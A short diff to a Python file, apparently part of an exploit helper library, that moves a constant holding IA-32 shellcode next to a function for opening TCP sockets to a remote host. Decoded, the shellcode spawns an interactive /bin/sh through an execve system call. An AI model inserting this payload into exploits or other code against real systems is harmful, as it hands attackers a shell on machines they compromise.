@@ -2,6 +2,9 @@ import socket
 import subprocess
 import os, fcntl
 
+# basic IA-32 shellcode
+SHELLCODE="\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
+
 # create a file that corresponds to a TCP socket to a remote host
 # arguments:
 #   host - hostname and port number in standard string
@@ -11,7 +14,6 @@ import os, fcntl
 # notes:
 #   - the file objects are buffered by default, so you will need
 #     to call f.flush() to send a packet over the wire.
-SHELLCODE="\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
 def tcp(host):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	host = host.split(':')
